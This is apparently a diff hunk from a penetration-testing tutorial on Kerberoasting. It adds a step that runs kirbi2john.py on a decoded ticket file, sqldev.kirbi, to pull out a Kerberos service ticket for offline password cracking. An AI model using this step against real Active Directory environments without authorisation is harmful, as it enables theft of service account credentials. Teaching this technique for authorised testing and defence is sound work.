@@ -197,3 +197,11 @@ We can place the above single line of output into a file and convert it back to 
 cat encoded_file | base64 -d > sqldev.kirbi
 ```
 
+Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.
+
+#### Extracting the Kerberos Ticket using kirbi2john.py
+
+```shell
+python2.7 kirbi2john.py sqldev.kirbi
+```
+
